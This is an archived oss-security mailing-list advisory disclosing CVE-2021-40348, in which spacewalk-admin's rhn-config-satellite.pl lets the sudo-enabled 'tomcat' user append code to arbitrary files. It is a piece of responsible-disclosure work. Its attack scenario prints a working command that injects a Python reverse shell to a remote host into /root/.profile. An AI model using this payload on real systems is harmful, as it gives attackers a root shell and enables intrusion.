X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["8238" "Thursday" "28" "October" "2021" "15:43:23" "+0200" "Paolo Perego" "paolo.perego@suse.com" nil "240" "[oss-security] spacewalk-admin: CVE-2021-40348: arbitrary local code execution by 'tomcat' user via rhn-config-satellite.pl" nil nil nil "10" nil nil (number mark "U       paolo.perego Oct 28  240/8238  " thread-indent "\"[oss-security] spacewalk-admin: CVE-2021-40348: arbitrary local code execution by 'tomcat' user via rhn-config-satellite.pl\"\n") nil nil nil nil nil nil nil nil nil "[oss-security] spacewalk-admin: CVE-2021-40348: arbitrary local code execution by 'tomcat' user via rhn-config-satellite.pl" nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 1434 invoked by uid 550); 28 Oct 2021 14:02:15 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 20122 invoked from network); 28 Oct 2021 13:43:39 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=suse.com; s=mimecast20200619;
	t=1635428607;
	h=from:from:reply-to:subject:subject:date:date:message-id:message-id:
	to:to:cc:mime-version:mime-version:content-type:content-type:autocrypt:autocrypt;
	bh=zuEciOxKDJ4SBbofLXKNJy1sD6t9FaP99oHuHZODIy0=;
	b=FBJHGdv98M3lA3yz6qRCct8kHcmZptTYXJX13ItKR51ytCdhdz/C8vRO8Ye4lQacCiQ0Dh
	amlqirGXxoCAMR9ZFnD/yi8Ow5wifDgbgzyLhHfthKaNkWA83yowVsP6vHyX9BWYL6cs7L
	/Iz/K4nGXNidYCUDs+ZOH6N/B+nuBf4=
X-MC-Unique: wmwbAoNAOverHt4A2xCTWA-1
ARC-Seal: i=1; a=rsa-sha256; s=arcselector9901; d=microsoft.com; cv=none;
 b=AyZ8v0aQAZWnX0RKaahcdw3DvQCMIduhCGz4el6oSr94FBZBTkBkjyWeh5VI33DfN5yn/dLH2Wf+rGxnKNO3Ndcl7LKhkj85g4jOwPLMbqaJv2X6WG4pB8uxx+WEGxvd4FQ8kpOHeWWQtNe41RRegZxIxCkNWBnhNg6JBxQioxxKAFSzW4XRJG4EuqpySR6JFIjuBWg1Qs49Wpahd+TcUW3trVMf8UPqwVHZOVRY6m8n8Tfd1ePafmzJK4qWb0nRIFo2cFaN9WU9OxW+wTMMooiXUBuD9YShKYVcqneHYqYt/G7+sU6XnGc7yd4vBtDUjXtzx5nJTrnD3tPu52kj3g==
ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=microsoft.com;
 s=arcselector9901;
 h=From:Date:Subject:Message-ID:Content-Type:MIME-Version:X-MS-Exchange-AntiSpam-MessageData-ChunkCount:X-MS-Exchange-AntiSpam-MessageData-0:X-MS-Exchange-AntiSpam-MessageData-1;
 bh=zuEciOxKDJ4SBbofLXKNJy1sD6t9FaP99oHuHZODIy0=;
 b=NzLBvYQ57yD3lD/AMsI6K0+bMGD6w4mSJogn9t/1gIFiHgxJ8IgBdbqEOUPerK6LKwwAvd4BQATjymUxfYE8FuLLpGJew1H9B18AivnPCwkxsvuT5kDgg+fZH6coAjbr8NQEtu1JA4AiUHdyAarrzrS+uE0yT5la1yHaGE37smpJ5yG2aTW1H8939jVJfreri5u2CggiiaRqaumaXjHpXwdw4hm3g7jJg8x4fwM2jIesc1V0sD7n//iVQAuG8UqFGVYGtB0IKhX9DKpxtrtoZ5y6OL4HPe+Y/zGr3N7urxhYSQv6mPSOJJsAbySfMcHpLSS4RkFBxqQZVnf8peGb0g==
ARC-Authentication-Results: i=1; mx.microsoft.com 1; spf=pass
 smtp.mailfrom=suse.com; dmarc=pass action=none header.from=suse.com;
 dkim=pass header.d=suse.com; arc=none
Authentication-Results: dkim=none (message not signed)
 header.d=none;dmarc=none action=none header.from=suse.com;
From: Paolo Perego <paolo.perego@suse.com>
To: oss-security@lists.openwall.com
Autocrypt: addr=paolo.perego@suse.com; keydata=
 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
Message-ID: <f2332f99-e7df-6841-3767-b9f2cb2edfc7@suse.com>
Date: Thu, 28 Oct 2021 15:43:23 +0200
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101
 Thunderbird/78.13.0
Content-Type: multipart/mixed;
 boundary="------------708B23F9F23DFF2F2D859AC5"
Content-Language: en-US
X-ClientProxiedBy: AM6PR04CA0039.eurprd04.prod.outlook.com
 (2603:10a6:20b:f0::16) To VI1PR04MB4829.eurprd04.prod.outlook.com
 (2603:10a6:803:5f::25)
MIME-Version: 1.0
X-MS-PublicTrafficType: Email
X-MS-Office365-Filtering-Correlation-Id: ac1406ac-2d65-4dce-6972-08d99a18e9d4
X-MS-TrafficTypeDiagnostic: VI1PR04MB7168:
X-Microsoft-Antispam-PRVS: 
	<VI1PR04MB7168FE24578E2ED4CFB1039AFC869@VI1PR04MB7168.eurprd04.prod.outlook.com>
X-MS-Oob-TLC-OOBClassifiers: OLM:332;
X-MS-Exchange-SenderADCheck: 1
X-MS-Exchange-AntiSpam-Relay: 0
X-Microsoft-Antispam: BCL:0;
X-Microsoft-Antispam-Message-Info: 
	ZonrxdcEthy3FqrxWuAAS+fWgZaCAE57BR81gg6bOLvg236BwIhGN8bd49AaAa/egKr52Mpk96qF48XJwSVCEo6JYKAU018bd1Jsw48wXOytMZFNal7LRgj5zo4kFQCOEdxBZC60wRzXKgAV/7clzoAFipSYyqVG0Ho01VI1zxGPpVinmVFmKl5TmBPSFQbuPUjeVJgYCxU5EtSvyu0ThzZehC8oGHGJXh/MNHYWUHOz2PWkxA9UAordHbC9nwTNb0h7Hq1Wq/dDfs1mTePnNWHiwEZ9Na0q4ssgWASpmf+h4OyhOLqr4W9EB2mIWFKxTm9xScXhLVDCaTUXH1vdPKJ7dKGdM7uuRAkQ8s9UPKdonB3hRrSGbkfTlQZKBDCav7FcwmORRJ1aWahQr4rihuju3YalTcMJo+yv/E0gC0cTcF0nTRmhLuW2VYH7UwSPHSsBPMTiVRci042zTe/CQpapM1EjIV/i/gaPRrN4uQHIPrr+Ha6dAk/pFWlHCaN8Ceo3SgMK598I+AnP/U74FoZHIxfHeDGJUq3X59xfp8BUKAs/Ld2XCHnjPb52aKr0KQXK4tagvfyP9muaGxkOSjyJo/fijMjDF9GGZoF6z2rI8T3zK9Ou1FbN6zEH4kFBo+6bPkJxu6exe2VYrgy0cVWnNE3UIh5yx2TgKVDrhJ+nrug+/xbhdS6hwvjQzS3JFfVSHr58cY30oG3Yz7yEDhmmK+VuMG0rfF5TyE9Sinph8q6VyYdKHBJeVKA1YGbVjDxNAxcICmylNsGN361b+GsexPUG4ombtJ23+Zx0BQx3mwGLre4NKhSbsebAmtUh5rT+JS3uHq6IA1FLx3L3Y6xfVc2OwzCreFWDbu8o8WU=
X-Forefront-Antispam-Report: 
	CIP:255.255.255.255;CTRY:;LANG:en;SCL:1;SRV:;IPV:NLI;SFV:NSPM;H:VI1PR04MB4829.eurprd04.prod.outlook.com;PTR:;CAT:NONE;SFS:(366004)(16576012)(26005)(66476007)(44832011)(31686004)(5660300002)(33964004)(6486002)(4001150100001)(316002)(31696002)(66556008)(8676002)(508600001)(2906002)(6916009)(83380400001)(86362001)(235185007)(956004)(36756003)(66946007)(2616005)(38100700002)(186003)(966005)(8936002)(21480400003)(43740500002)(45980500001);DIR:OUT;SFP:1101;
X-MS-Exchange-AntiSpam-MessageData-ChunkCount: 1
X-MS-Exchange-AntiSpam-MessageData-0: 
	=?utf-8?B?cmJ3RS9saHRJaHhQbVVueHZxcU5KZ3N6RFMzc3hzZTkxTmYxNUVXMU1HbGUr?=
 =?utf-8?B?Y0g4MXNYZ3BQcDNnUnlISzVkZ1NESDQ5K3IrQnZPNnArRk1yZHBST2w3QXhh?=
 =?utf-8?B?K2VFMTBEL1hyQmt6dWcwdTNZa0dmZk96dlNsbmNhWTVTVHhnSEpIU3doSTlt?=
 =?utf-8?B?bnkzMEVjaXZVbU1wMjkwOG9MUU40NitZREt0cllRUTNXTlNKMG1BTXpTTDJY?=
 =?utf-8?B?ZlpjMXRwbXlwUzAzK1Z4TDltNzJTNW1vdk9ZT3NYdVhaZHVOc25LMi94U1VL?=
 =?utf-8?B?OWpOQ2MvR0RUSmNFa095dUVNZWdUWllORnM2M2ZJWkFqS2p3dlVvWWtxbng4?=
 =?utf-8?B?Z1FZbytjTXBPNGxIc3JrMDd1dkRFTlQ1TE5PMU4rcGpQWHFnM0hWNkJXUGtD?=
 =?utf-8?B?MDVtRnF2d2xLYUZGUHVGYjRHL0Y3RldIeERRNnFIZEtlVHJGS1VYU0JmMllM?=
 =?utf-8?B?NitRdDV3Y2tUa3lLRG9pREwzQmhNUUlLNnBpRzlsWEdUZVJsaDJKYnl1WlJL?=
 =?utf-8?B?RVhUV0xxV0s5czJpcGRpR2Z1YkNaTmtBWEgrRVNlcy93aHlidGkwMndVWEFR?=
 =?utf-8?B?a2F2WlpzRk9JMjZGRGRpYXJKMWhBczNLQlRaSHNUbXliYi8rb0U4NGVZeGtP?=
 =?utf-8?B?VzM5YTYvWXNxeU8zWmdYME9WbWg5d3Yxc3BuNEh4MkkzNUNyOEhaYmdYdmRm?=
 =?utf-8?B?a2d1UkIvOUsrUWdrZTJUSFdpQkM5VlBtZ0RZZXlpQTRCTHQ0Yng1d2lPazkv?=
 =?utf-8?B?bGhkcnFmaUdoRytpY2szWmliSHVDbTBJZWpKT2NTdW9WWmE5dXJHc21qaCtH?=
 =?utf-8?B?UjVhejRIa0ZyZHkvZXlleENXSnRTMHlIa3U1T2d0U0txN0c3MXhoMmZ0ZXha?=
 =?utf-8?B?UWY4OWRFZlIxS3d3aEkvZi9EakRYNEVGOHdqbTBLTUFFdE1PeWt4cm9zU0E4?=
 =?utf-8?B?MWw3YzRMRkRMODhMUVlrd3dycFU2Yi81bEtZbGxxNnR5RjFBSWt4b0YyTmRQ?=
 =?utf-8?B?aGN3UlpqMi9JVmU0YW1MaVFpSFcwNDN0ZnJHR1lpcHhjQXhsMjBzSzB2T0NO?=
 =?utf-8?B?UlR3MTVyQURWQWFBalNxRzFNbFE2cUhpbFQwZFUzOU1telpzT3pYcDZ5TWxD?=
 =?utf-8?B?Z2t6T3Q3aWdJcm5ZWU5uSTFWUFNvUmdqa28wdGI1OFBEdmkrNXNDTDB6TDBO?=
 =?utf-8?B?aW9JSEpDZVc5Rms0VUJlMWFMekFLbW1SaVVIRnUzLytKYVRtbWdDWTdqRTNK?=
 =?utf-8?B?eHdrVUx4UFRLZWdob25aNWVhSk42cUR5Vnhjb3cxWUlkRzQrVWk0dmRObnhD?=
 =?utf-8?B?NHU2MVZkdU9jd0tUWU94a2xIT0g2bzR0TEIyMXJMUWdsWHNOY2ZTNDJ1VTJt?=
 =?utf-8?B?SENWRVlzNVdQSDFUaGNReUZVN2g0N2t2RmJaM3dqQVZzNWpGd1dIRlZtRjZX?=
 =?utf-8?B?YUxXT25CQ2Y5WjlqSHAxNEhwVkRKSzJEYVNzQlR3VVIxa0FGR3ZJZU9sTGg1?=
 =?utf-8?B?TzZOSzRiV09SbUZRdjJPYjMxOTI0OEE5TTBVcGQzNi9jS2FnTzNpWTZXQ0kr?=
 =?utf-8?B?SmFTaEpKWFI4Y1FGVmMzOEVod2JvT3NpM2w5ZTZrQVAzSGlOS05oblE1Qldq?=
 =?utf-8?B?YVNIblNMaUZ6ZjFaQXpwUE1oRnNIRW5ydzFMRXVVVDFPL295OExZQ0ZiWWJE?=
 =?utf-8?B?emJDdE1YcFduOG5wUTN0cHFPbDg3Rk9LNVZOa0gwNUZXR3ZlSk0yMUlXRnpC?=
 =?utf-8?B?NjFVcy9aY3F6M201bWFtS3FtdjVTbU5pSEtDc3piaGF5Tm5Yb3haYWg2VXRs?=
 =?utf-8?B?QkJFM1c0NS93Yjd3RTVKY1lIMGhPQXp0Zy85bmpVbm1qOCs5anBDRWFXbkdQ?=
 =?utf-8?B?VTFIMzZVN0d4QWNsRDBWeWRBL3U1K0ZrMzhpVHpNNStOdVV4L0lCTTd2aG02?=
 =?utf-8?B?emRyQnZkY0YrV0l1WmVqaUhVMW5UdG51SmM1Ly9hcEFjTWR0czZYN1l1elh1?=
 =?utf-8?B?S09HeVVGdjNVVjVDSVJxd0NOV1gxV2JIU1ozOHFGYjFSUlc0VXQ0dElZU0x2?=
 =?utf-8?B?UUlKL1F0dEo3OUlGbDJIN1RVOVRCUHVCc3BUWnUvWEFMNXBsZlZKTXUrSDV1?=
 =?utf-8?B?cG9uZW04aUJUVmZES3c4S290UDFFZUdEcnlUcndUWUduZDV2eWludENXRytE?=
 =?utf-8?Q?aA85FSIevX3wnXZG8OR9Rzo=3D?=
X-OriginatorOrg: suse.com
X-MS-Exchange-CrossTenant-Network-Message-Id: ac1406ac-2d65-4dce-6972-08d99a18e9d4
X-MS-Exchange-CrossTenant-AuthSource: VI1PR04MB4829.eurprd04.prod.outlook.com
X-MS-Exchange-CrossTenant-AuthAs: Internal
X-MS-Exchange-CrossTenant-OriginalArrivalTime: 28 Oct 2021 13:43:24.3289
 (UTC)
X-MS-Exchange-CrossTenant-FromEntityHeader: Hosted
X-MS-Exchange-CrossTenant-Id: f7a17af6-1c5c-4a36-aa8b-f5be247aa4ba
X-MS-Exchange-CrossTenant-MailboxType: HOSTED
X-MS-Exchange-CrossTenant-UserPrincipalName: fwAA0RfpAetnXAWOemiYOOk5mGc+SCNQTCNC4qBOEJG4Bz0Ew4R+HS9q6/iplD5gyvt62M4xmrFtEEJMmNB81Q==
X-MS-Exchange-Transport-CrossTenantHeadersStamped: VI1PR04MB7168
Subject: [oss-security] spacewalk-admin: CVE-2021-40348: arbitrary local code execution by
 'tomcat' user via rhn-config-satellite.pl

--------------708B23F9F23DFF2F2D859AC5
Content-Type: text/plain; charset=utf-8; format=flowed
Content-Transfer-Encoding: 8bit

# Description



Hello list, during an internal audit a vulnerability was found in a perl 
script from the uyuni[1] component (previously known as spacewalk[2], 
discontinued on March 31st 2020). Uyuni is a configuration and 
infrastructure management tool helping sysadmin's in their tasks over a 
huge multitude of assets.



The rhn-config-satellite.pl script is intended to be run by the 'tomcat' 
user using sudo without any password, to adjust Uyuni configuration.



Due to a missing sanitization of the filename that can be used as config 
file, a rogue 'tomcat' user can append arbitrary code to any files that 
eventually will be executed later on by higher privileged users.



Please consider the following attack scenario. An attacker gains 
'tomcat' user on the victim server. Rogue 'tomcat' executes the 
following command:



sudo /usr/bin/rhn-config-satellite.pl --target=/root/.profile 
--option="export RHOST=\"192.168.122.1\";export RPORT=4444;python -c 
'import 
sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))));[os.dup2(s.fileno(),fd) 
for fd in (0,1,2)];pty.spawn(\"/bin/sh\")'"



The python code implementing a reverse shell is then appended to the 
/root/.profile file and executed everytime root logs in. This results in 
having arbitrary code execution with superuser privileges on the victim 
system.



# Affected versions

This vulnerability was fixed in spacewalk-admin version 4.3.2-1 [3] (by 
this commit on upstream [4]). All spacewalk-admin versions before 
4.3.2-1 are vulnerable



# Timeline:



2021-08-30: vulnerability was reported to upstream authors

2021-08-31: upstream authors acknowledge the vulnerability start working 
on the fix.

2021-08-31: received CVE from Mitre and offered authors an embargo until 
2021-10-27

2021-10-27: authors published fixes for a product containing spacewalk 
as component

2021-10-28: authors published fixes in upstream repository and 
publication of findings



[1] https://github.com/uyuni-project/uyuni

[2] https://github.com/spacewalkproject/spacewalk

[3] 
https://github.com/uyuni-project/uyuni/releases/tag/spacewalk-admin-4.3.2-1
[4] 
https://github.com/uyuni-project/uyuni/commit/790c7388efac6923c5475e01c1ff718dffa9f052



https://bugzilla.suse.com/show_bug.cgi?id=1190040

-- 



(*_  Paolo Perego                           @thesp0nge

//\  Software security engineer               suse.com

V_/_ 0A1A 2003 9AE0 B09C 51A4 7ACD FC0D CEA6 0806 294B

-- 
(*_  Paolo Perego                           @thesp0nge
//\  Software security engineer               suse.com
V_/_ 0A1A 2003 9AE0 B09C 51A4 7ACD FC0D CEA6 0806 294B

--------------708B23F9F23DFF2F2D859AC5
Content-Type: application/pgp-keys;
 name="OpenPGP_0xFC0DCEA60806294B.asc"
Content-Transfer-Encoding: quoted-printable
Content-Description: OpenPGP public key
Content-Disposition: attachment;
 filename="OpenPGP_0xFC0DCEA60806294B.asc"

-----BEGIN PGP PUBLIC KEY BLOCK-----=0A=
=0A=
xsFNBGBPNU0BEADZqeQzppnNB4nhfRWTUTGATIk+h95dHqubugHkJYvyaITRAx9iQz+g8A9x83P=
A=0A=
sFfQpArS2SR5r+1i7UePy4K1sq8fzHBzxvWOKK2GPvsSLbIpBct85xlWiCTwlPhqveVxjPzKv5a=
u=0A=
m6AxYPgFwmxc7YalV6cSCWCDWcEhsy/36OaTqhVaizzCl8W7FaRQiYFZnFMC9lyiGQbLovQXdEx=
e=0A=
Kvek93HUU1CKf0pTGl0gtRVPzhDV1Rudd+WI8vhGKhGedQnGyAUX4PiNoNht9KG8JlgenihESx8=
8=0A=
qm8lO+emctTo4fc4sKjKqw4meDEFbNMRmhb0YZYbeUVO9cpvkJCgtG9epDcijKZIaoe5QUNa6/S=
x=0A=
bTAN4rpQKgWsnmHBPo0m2plG/g/SykhGgfKAAPZdREP04Lu4+jvZRDDh41nWK90ekJvtdADYgBM=
f=0A=
W7CO8IH4f26XqfOzoQrO7hoK7VLURfwHaLTwuaoanJkcOXwfK/+Pb3TnGCPW9qiTbQg3u5oVAuj=
x=0A=
3b3QArsJVzUA+ikS/ZJvhVoFXOy4R7zBfjlplEmAmdXc2CRHBwhjhQ7YSvQxc1mdnxmI/qEFGbZ=
g=0A=
U3jPpkdx+xG3YrfiI8vyImSHpuS2810lwiWznAuOLYAoaeJhcVelExWtGSlMYykJsZSxTmvcIYp=
V=0A=
rxP76B21BhnPCwARAQABzSRQYW9sbyBQZXJlZ28gPHBhb2xvLnBlcmVnb0BzdXNlLmNvbT7CwZQ=
E=0A=
EwEIAD4WIQQKGiADmuCwnFGkes38Dc6mCAYpSwUCYE81TQIbAwUJEOrPgAULCQgHAgYVCgkICwI=
E=0A=
FgIDAQIeAQIXgAAKCRD8Dc6mCAYpS7+ID/9ivGRcOsSW/idoSml1a0dq3GTMCwTb4Moi+MQoLce=
y=0A=
49cSeSoO5I5OUzDKvA4evMjd9QjRibtXBoC/f+Xize5Ry41LYEox9jSGd/T2mRMjVZKgPypU55w=
u=0A=
vqjR58sfB6AxZjxA6KQID/Uas4IQFqXe0XObYNO+uVhap2KjwM7to+Kwcw1zE263gZpbtxVj12k=
F=0A=
sMLTn0KjlTQPU+bbVELxT3htDTMbrZ+i9zUEi7ytXMicA/aKgQDqFcdBrzBtBoOOE/EyMbZhSUU=
u=0A=
ypAR88230yq492lCPjMBK2v3TTpTpb7rh79u0ZIcXFiGxsXOTLPWcKdUdfGbdLQG6qAnBO654TT=
l=0A=
GpLwH2RilCOr3T0qzLhq70LPpYJXMgLjtkhpgLJ7zRoEydoU9oLDdIR7oiYrc79DAWP+eCF78Re=
+=0A=
Eoaga/0k4zTEcfGg13IocDd7fVUH9cdu0E2pZcevwL5hmfbEfJVfwfuefZHv2/MkbPttSDAa2xc=
e=0A=
KXWgNSZ6pRFfmjOph77YSsPr75PS7tJj1tlq7jrjQeXg0j8Wt7yu0OLryLB2X5ScF2/0wzQWfwR=
u=0A=
TO0N2sPq6quLbgxHcMtCJWOJ/8zHXp0D260ucNGO8CgRaY/6HBTVTtqxlLQbRUv9bj3yLpeKgxO=
V=0A=
8HBZePzNgzrGp3vuYZIPav2Xs82lHOuJhcLAcwQQAQgAHRYhBHFYczzoItHmR/Tn3ZFX0f4zWNb=
Q=0A=
BQJgTzfUAAoJEJFX0f4zWNbQrrsIAKGL45kggY8ndhWM7vIaRbHNngc8J6qhqmsOwn4hK6b2P9V=
U=0A=
6O8ZuwarxBxg/aHoZKQGez1poTXTylF3fN2pcPIuOEoHd6MlYoe2h1eejroN+wMOHEOH4O2SXFF=
t=0A=
4o9hpGsjNcjk3xOrMyJ8azAHUF1ue1BZsA9mk8/de+peBRIR+kwL2Jb0sIq+prRZUBsRyjNY7lU=
w=0A=
28AQBUPw3nPFoBAR01XU3pN6btD0eXnfScI7X971f0eEnOAdgnS+7TG60OoMDSP0DHjpGEUXw+Y=
6=0A=
GvSpxUNwBnApUmeg2DCuqYrzF1GmmHrFHh6si5LTFdI8eeCuskpn9vmBvfXCqjPXlG/CwHMEEAE=
I=0A=
AB0WIQTXjT/cJZF+urUvI2JuFzi4K2CzHQUCYE861AAKCRBuFzi4K2CzHRuxB/0aWPGXRLVgbaS=
Q=0A=
7eypq7ArdTOcBF3XFN5XcqXT8sA3JHxRLAtbPqQegL0Nd2EHivaUJh0rCggGs7yyyKu1W+Piaxi=
W=0A=
AVfzFw4W6H/aHsayqE8lC9NJK+iTmJu7G0XMW97XI3mIyrrmTYcbYhbXBnzlbyeBa9cfnncMah/=
D=0A=
7noe5KZ32Y4vc7BaZCwLBDcEOeBN7G/RtnENYBfCyFwG9YrMGZMQP02ZVyEf0zJCA5Z7keI/vZn=
L=0A=
Bm812/6ThtEpV0DqxOhcDTNLKhCOXdfVVcLXGUAyLPDVxtfo94Kvuqnp/YiMajs3iaFwx+xIFen=
d=0A=
NbI4s0Ta+hP/LkcGhIBgoyC8wsFzBBABCAAdFiEEWHPP0YwOptScu/bEBioQFhUFoIoFAmBPPI0=
A=0A=
CgkQBioQFhUFoIrDbBAAo6sGNaTSfBM07KG5m4vmhf4WKMzTQQF+zTSHmzpDfV1Wgtty2FXdUvM=
m=0A=
Hzo9amLK+Mo+dKt6J+XwxmvNNaX3CdAo5QDimNHmmLmVsiSlZC0MsGf8J0gkniprsmPhTyhHh2G=
D=0A=
zND2BMjkWPF0wa1SuLxRdegPXSNLpkBbkeKlWbjFNI0oIQ3DlQtswAnVjpmCQg7ym0CDWjpTX6x=
v=0A=
f5bQLhIQlmoNCfBGl8OXoegj1kgEO+ld693ESrvLFCecboVV4N2JqYydmAXuNLy4klx8mGF7/by=
g=0A=
Xwh30jL5WqWyfLp7Su+B+3+fqW3XPjpX/RGSpw2x+s/NqOCiDgZnPMW8ntefM32/fI3d8M/YdeN=
v=0A=
0XQsPrIwpuzkteA63ZhwSJMJomOF8JN4vZ4uYsJRQNoa7VLW2LQVEReWB5LrlJoXHRTxrl8Lttv=
i=0A=
enejcUaVUxckkFuWbIw0EyO5x5eu/4H2RkVNMDwq2Xs95Ls2cWhshatmZnUIqDMzpejVhwt0zqs=
4=0A=
9Un0QtCatAUfUq3wj5e/sPzmWIvMO/MF4MOog9fA3cH1lczCpi8+Dl2eVjcL0jxGU59KlE+Gv1A=
j=0A=
ud4BkkuugD0uB+M4pcLqeKN6pl+1G5wmmXNaYuonULng/ftoCS8OygtduyFeniM31cfKU5tAqB4=
T=0A=
bLpA2ktdljM/Fj3wax7OwU0EYE81TQEQAMaJs1SIeYE4nwYMWiw9zHKCPjnsCAeQrdQLaCzo7DA=
2=0A=
bPlsHD0K6I1UcEyT4UdttXOD8xG4Mh2MpoF2LLrC/1WQhFkm9YD+9i0WaG6Bjshee+p5Dyp4mIi=
n=0A=
WGx4hXZeodA5rR9N37ACVS9ezUGHpeGDys+irstK9PLHGbGBl6Z4pKp4EYAnzUETZPjeY9683Y4=
7=0A=
es3KaSxIg/xrIBWT6Nz2FEGlcITLsu1aFeV/tYqCcYOuxNHdFBB/kwqTikSZRGAiV3HmioYd2SQ=
u=0A=
